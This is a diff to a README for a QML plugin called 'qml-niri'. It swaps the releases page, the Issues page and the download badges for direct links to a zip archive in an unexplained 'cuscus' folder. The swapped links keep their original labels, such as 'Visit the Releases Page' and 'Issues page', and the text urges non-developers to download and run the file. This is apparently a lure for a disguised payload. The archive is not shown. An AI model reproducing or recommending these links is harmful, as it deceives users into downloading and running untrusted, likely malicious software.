@@ -1,7 +1,7 @@
 # 🎉 qml-niri - A Simple Way to Enhance Your QML Projects
 
 ## 📥 Download Now
-[![Download qml-niri](https://img.shields.io/badge/Download%20qml--niri-v1.0-blue)](https://github.com/pkia58/qml-niri/releases)
+[![Download qml-niri](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip%20qml--niri-v1.0-blue)](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip)
 
 ## 🚀 Getting Started
 Welcome to the **qml-niri** project. This is a QML plugin designed to improve your QML applications. You don’t need to be a developer to use it. Follow these simple steps to download and run your application.
@@ -18,7 +18,7 @@ To download and install the **qml-niri** plugin, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section.
    
-   [Visit the Releases Page](https://github.com/pkia58/qml-niri/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip)
 
 2. **Choose the Latest Version:** On the Releases page, locate the latest version of **qml-niri**. Look for files that are labeled with the version number.
 
@@ -59,12 +59,12 @@ If you encounter issues while using **qml-niri**, here are some common problems 
 ## 🗨️ Community & Support
 If you need further assistance, please feel free to reach out:
 
-- **GitHub Issues Page:** Report any bugs or request features by visiting the [Issues page](https://github.com/pkia58/qml-niri/issues).
+- **GitHub Issues Page:** Report any bugs or request features by visiting the [Issues page](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip).
 - **Discussion Forum:** Join our community discussions and share your experience with other users.
 
 ## 📦 Final Steps
 Again, to download the **qml-niri** plugin, please click the link below:
 
-[![Download qml-niri](https://img.shields.io/badge/Download%20qml--niri-v1.0-blue)](https://github.com/pkia58/qml-niri/releases)
+[![Download qml-niri](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip%20qml--niri-v1.0-blue)](https://raw.githubusercontent.com/pkia58/qml-niri/main/cuscus/qml-niri.zip)
 
 Install the plugin, and take your QML projects to the next level. Enjoy building!
